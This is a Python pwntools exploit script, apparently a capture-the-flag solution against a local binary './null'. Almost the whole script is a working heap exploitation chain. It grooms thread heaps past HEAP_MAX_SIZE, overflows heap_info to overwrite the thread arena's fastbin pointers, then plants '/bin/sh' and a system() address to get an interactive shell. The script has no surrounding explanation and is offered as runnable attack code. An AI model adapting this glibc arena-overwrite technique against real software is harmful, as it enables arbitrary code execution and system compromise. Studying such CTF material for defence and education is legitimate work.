from pwn import *


def use(size, pad_block=0, none=0, content="a"):
	r.recvuntil('Action: ')
	r.sendline('1')
	r.recvuntil('Size: ')
	r.sendline(str(size))
	r.recvuntil('Pad blocks: ')
	r.sendline(str(pad_block))
	r.recvuntil('Content? (0/1): ')
	if none:
		r.sendline('1')
	else:
		r.sendline('0')
		return 0
	r.recvuntil('Input: ')
	if size < len(content):
		r.send(content[:size-1])
		sleep(1)
		r.send(content[size-1:])
	else:
		r.send(content)
		
r = process('./null')
raw_input('?')

r.recvuntil('Enter secret password: ')
r.sendline("i'm ready for challenge")

log.info("Attack to mprotect new thread heap...")
for i in range(4):
	use(0x4000-0x10, 999)
	log.info("use step %d with size %#x" %(i+1, 0x4000-0x10))
use(0x600, 0) # make top_chunk_size to small
use(0x4000-0x10, 95) #attack to new_size > 0x4000000 ---- if ((unsigned long) new_size > (unsigned long) HEAP_MAX_SIZE)
log.info("DONE! New thread heap protected!")
log.info("Attack to mprotect new thread heap...")
for i in range(4):
	use(0x4000-0x10, 999)
	log.info("use step %d with size %#x" %(i+1, 0x4000-0x10))
use(0xd00, 0) # make top_chunk_size to small
use(0x4000-0x10, 94) #attack to new_size > 0x4000000 ---- if ((unsigned long) new_size > (unsigned long) HEAP_MAX_SIZE)
log.info("DONE! New thread heap protected!")
log.info("Attach to overwrite Thread arena...")
for i in range(4):
	use(0x4000-0x10, 999)
	log.info("malloc step %d with size %#x" %(i+1, 0x4000-0x10))

#Triger to mprotect full segment before thread arena
use(0x4000-0x10, 93)
use(0xd00, 0)
use(0x2c00-0x10, 0)
payload = "a"*0x6c0 #padding to heap_info(first thread heap)
payload += p64(0) #thread arena
payload += p64(0) #priv_heap
payload += p64(0x3ffd000) #size
payload += p64(0x3ffd000) #mprotect_size
payload += p32(0) #Serialize access.
payload += p32(3) #flags
payload += p64(0x60201d) #fastbin 0x20
payload += p64(0x60201d) #fastbin 0x30
payload += p64(0x60201d) #fastbin 0x40
payload += p64(0x60201d) #fastbin 0x50
payload += p64(0x60201d) #fastbin 0x60
payload += p64(0x60201d) #fastbin 0x70
payload += p64(0x60201d) #fastbin 0x80
log.info("Overwrite thread arena")
use(0x600-0x10, 0, 1, payload)
#Triger done and overwrite thread arena complete
payload = "/bin/sh\x00" #/bin/sh
payload += "\x00"*3 #padding to 0x602038
payload += p64(0x400978) #system
payload += "a"*0x50
use(0x60, 0, 1, payload)
r.interactive()
